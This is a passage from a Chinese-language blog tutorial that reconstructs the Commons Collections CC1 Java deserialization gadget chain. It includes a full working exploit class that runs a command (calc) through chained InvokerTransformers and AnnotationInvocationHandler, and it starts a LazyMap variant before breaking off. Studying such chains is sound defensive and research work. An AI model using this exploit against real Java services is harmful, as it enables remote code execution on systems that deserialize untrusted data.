#C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">unserialize</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> Filename) throws IOException</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> ClassNotFoundException{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #E06C75"> ois </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #E06C75">(</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #E06C75">(Filename))</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> obj </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> obj</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li></ul><h4 id="解决问题3"><a href="#解决问题3" class="headerlink" title="解决问题3"></a>解决问题3</h4><p>第一个if：主要是   对于注解的class进行限制——————&gt;<strong>传入的注解参数，是有成员变量的</strong></p><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121224107202.png"></p><p>获取type成员方法，然后又在成员变量中查找它</p><p>所以需要一个有成员方法的class（注解），而且key还要改成成员方法的名字</p></li><li><p>换个其他注解<code>（Target）</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121224639077.png" alt="image-20251121224639024"></p><p>返现返回的是value（）</p><p>但是我们构造的key，所以<strong>将key改成value</strong>试试</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121224440732.png" alt="image-20251121224440700"></p><p>发现可以进去了</p></li><li><p>修改</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> map </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;value&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;aaaa&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> transformedMap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">TransformedMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, chainedTransformer);</span></span></code></pre></div></div></figure></li></ul><p>第二个if：判断能不能强制转换（不能强制转换即可进）</p><h4 id="解决问题2"><a href="#解决问题2" class="headerlink" title="解决问题2"></a>解决问题2</h4><p>最后的最后就是要改<strong>传入对象</strong></p><p>用到的是constantTransformer</p><ul><li><p>进去看一下</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122152706797.png" alt="image-20251122152659662"></p><p>意思就是说，不管接收什么，都<strong>返回自己的值</strong></p><p>所以加一句这个即可</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122153034102.png" alt="image-20251122153034060"></p><p>所以在调用checksetvalue时，返回valueTransformer.transform(value)</p><p>调用transform(value)时，走到上面提到的代码</p><p>将value替换成Runtime.class</p></li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC1Test</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InvocationTargetException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InstantiationException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchMethodException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//根据runtime反射   对InvokerTransformer写runtime反射</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        Method getRuntimeMethod =(Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}).transform(Runtime.class);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        Runtime r = (Runtime)new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}).transform(r);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//利用ChainedTransformer缩减代码</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">transformers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[]{</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">})</span></span><span class="line"><span style="color: #ABB2BF">        };</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">chainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #ABB2BF">(transformers);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        chainedTransformer.transform(Runtime.class);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">//        //Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        Runtime r = Runtime.getRuntime();</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        //方法名为exec，参数类型为String，参数值为calc</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        // invokerTransformer.transform(r);</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//利用hashmap写一个存储值的map，并且执行上面的  恶意代码</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">map</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;value&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;12&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">transformedMap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">TransformedMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, chainedTransformer);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        for(Map.Entry entry:transformedMap.entrySet()){</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//            entry.setValue(r);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//        }</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//构造一个经过加工、包含恶意 TransformedMap 的 AnnotationInvocationHandler 对象，让它在反序列化时进入 readObject，进而触发 commons-collections 的 transform 链。</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">o</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Target</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, transformedMap);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">serialize</span><span style="color: #ABB2BF">(o);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//序列化反序列化函数</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h3 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h3><p>InvokerTransformer.transform(value)</p><p><code>transformMap+decorate</code></p><p>valueTransformer.transform(value)——–&gt;后面修改成了ChainedTransformer.transform(value</p><p>checkSetValue(value)</p><p>entry.setValue(value)</p><p>AnnotationInvocationHandler  的  memberValues.entrySet()</p><p>AnnotationInvocationHandler.readObject</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122163300671.png" alt="image-20251122163300608"></p><p>或者看这张图（这张图片出自<a href="https://bxhhf.github.io/2025/04/17/CC1/#%E4%B8%80-%E7%8E%AF%E5%A2%83">Bxhhf’s blog</a>）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122160513255.png" alt="image-20250427210201599"></p><h2 id="LazyMap-版"><a href="#LazyMap-版" class="headerlink" title="LazyMap 版"></a>LazyMap 版</h2><p>和上面不同的就是查找transform的时候，转到的是LazyMap<code>上面是TransformMap</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122162812242.png" alt="image-20251122162812183"></p><h3 id="逐步分析-1"><a href="#逐步分析-1" class="headerlink" title="逐步分析"></a>逐步分析</h3><ul><li><p>查看LazyMap的get方法</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">get</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> key) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// create value for key if key is not currently in the map</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">containsKey</span><span style="color: #ABB2BF">(key)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">factory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(key);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(key, value);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> value</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(key);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>调用了 factory.transform(key)</p><p>而 factory</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122163515543.png" alt="image-20251122163515509"></p><p>Transformer传</p><p><strong>这个类的意思是：</strong></p><p>如果传入的时候不存在key，则利用transform方法调用<br>存在则直接返回key值</p><p>所以要确保 <code>map.containsKey(key)</code> 里面没有key值</p></li></ul><p>因为get查找实在太多了，根本找不过来，看看其他师傅的exp吧</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122200905386.png" alt="image-20251122200905278"></p><ul><li><p>查看谁调用get</p><p>看到上面是AnnotationInvocationHandler</p><p>在这个文件里面搜素get(</p><p>一个有五个，看哪个我们可以控制</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251122201201630.png" alt="image-20251122201201599"></p></li><li><p>找到了invoke（）方法</p><p>因为invoke（）方法写动态代理时必定调用（动态代理不管传入什么都会调用Proxy.handler.invoke()）</p></li><li><p>由于现在Proxy要实现接口，现在就是要找一个接收接口的容器（比如：hashmap）</p><p>于是又找到了AnnotationInvocationHandler.readObject</p><p>因为它可以接收map，而正好对应上面的容器</p></li></ul><blockquote><p>现在的目的就是到走到最后的 <code>Object result = memberValues.get(member);</code></p><p>所以需要绕过下面的限制</p></blockquote><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">invoke</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> proxy</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> method</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[] args) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> member </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">method</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">[] paramTypes </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">method</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameterTypes</span><span style="color: #ABB2BF">();</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// Handle Object and Annotation methods</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//如果调用equals方法，后面就会返回equalsImpl(args[0])，这不是我们的目的，    所以就不能用equals方法</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">member</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;equals&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">paramTypes</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">1</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span></span><span class="line"><span style="color: #E06C75">        paramTypes[</span><span style="color: #D19A66">0</span><span style="color: #E06C75">] </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">equalsImpl</span><span style="color: #E06C75">(args[</span><span style="color: #D19A66">0</span><span style="color: #E06C75">])</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//如果参数不为0（有参方法），就会抛出异常，为了不要抛出异常，  